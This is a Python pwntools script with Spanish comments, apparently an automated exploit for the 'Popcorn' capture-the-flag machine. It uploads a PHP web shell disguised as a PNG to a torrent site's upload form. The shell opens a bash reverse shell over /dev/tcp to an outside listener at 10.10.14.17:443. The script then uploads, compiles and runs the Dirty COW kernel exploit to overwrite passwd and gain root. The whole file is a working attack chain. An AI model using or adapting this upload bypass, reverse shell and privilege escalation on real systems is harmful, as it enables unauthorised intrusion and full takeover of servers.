#!/usr/bin/python3

from pwn import *
import sys,signal,requests

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT,def_handler)

#Proxy 
burp = {'http': 'http://localhost:8080'}

#Varibales globales
url = "http://10.10.10.6/torrent/"

def upload_file():
    
    post_url = url + "upload_file.php"
    
    content = "<?php echo shell_exec('bash -c \"bash -i >& /dev/tcp/10.10.14.17/443 0>&1\"');?>"
    
    file_to_upload = {'file':('revshell.php',content,'image/png')}

    params = {'mode': 'upload', 'id': 'revshell'}
   
    data = {
            'submit': 'Submit Screenshot'
            }
    r = requests.post(post_url,params=params, files = file_to_upload, data=data) 

def makeRequest():
    
    get_url = url + 'upload/revshell.php'
    requests.get(get_url)    

def upload_dirty():
    
    post_url = url + "upload_file.php"
    
    f = open("dirty.c", "r")

    content = f.read()
    
    file_to_upload = {'file':('dirty.c',content,'image/png')}

    params = {'mode': 'upload', 'id': 'dirty'}
   
    data = {
            'submit': 'Submit Screenshot'
            }
    r = requests.post(post_url,params=params, files = file_to_upload, data=data)

if __name__ == '__main__':
    p1 = log.progress("Popcorn Pwn Web")
    p1.status("Reverse Shell y explotacion de la vulnerabilidad Dirty Cow")
    time.sleep(1)
    p1.status("Subiendo archivo revshell.php")
    upload_file()

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible establecer la conexion")
        sys.exit(1)

    else:
        p1.success("Reverse shell obtenida con exito")
        time.sleep(1) 
        p1.success("Subiendo dirty cow")
        upload_dirty()
        time.sleep(1)
        shell.sendline(b"gcc -pthread dirty.c -o dirty -lcrypt")
        shell.sendline(b"./dirty passwd")
        shell.interactive()
